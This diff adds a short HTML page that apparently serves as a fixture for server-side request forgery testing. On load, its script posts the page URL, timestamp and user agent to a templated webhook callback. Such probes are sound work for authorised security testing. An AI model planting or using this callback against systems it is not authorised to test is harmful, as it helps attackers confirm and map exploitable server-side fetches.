@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Callback Test</title>
+</head>
+<body>
+    <h1>SSRF Callback Test</h1>
+    <script>
+        fetch('{{WEBHOOK_URL}}/ssrf-callback', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                from: window.location.href,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        }).then(() => {
+            console.log('Callback sent successfully');
+        }).catch(err => {
+            console.error('Callback failed:', err);
+        });
+    </script>
+    <p>SSRF callback sent to webhook.</p>
+</body>
+</html>
